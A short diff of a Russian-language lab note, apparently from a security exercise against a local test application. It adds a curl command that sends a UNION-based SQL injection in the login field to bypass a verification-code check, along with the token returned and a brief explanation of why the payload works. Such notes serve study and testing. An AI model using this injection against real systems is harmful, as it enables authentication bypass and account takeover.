@@ -4,3 +4,14 @@
 Пароль: что угодно
 
 
+2. Код подтверждения*
+curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '1111', null, null -- \", \"code\":\"1111\"}"
+
+Результат:
+* Connection #0 to host localhost left intact
+{"token":"56a54c8125e738cdfb11c17afb26895c2c6fa3f459eb87fd94f4c7d62bc720edb1599281692da7dd0e0d1bbe4113e308947ba7d0b5b6e3eda578252db3071f71aa4528c1cb7973a751fb06981a9c410447175cd3c0ae3dd60d474b7e44cced3a0b6c07b65f822b6ef570825084be3342c92b81dc56e73b2eaa4bef10bd59f8db"}    
+
+Комментарий:
+объединенный  запрос с помощью UNION
+выборка SELECT по пяти условия, так как в таблице пять значений включая ключ
+поле кода должно совпадать в выборке и в code (в нашем случае 1111)
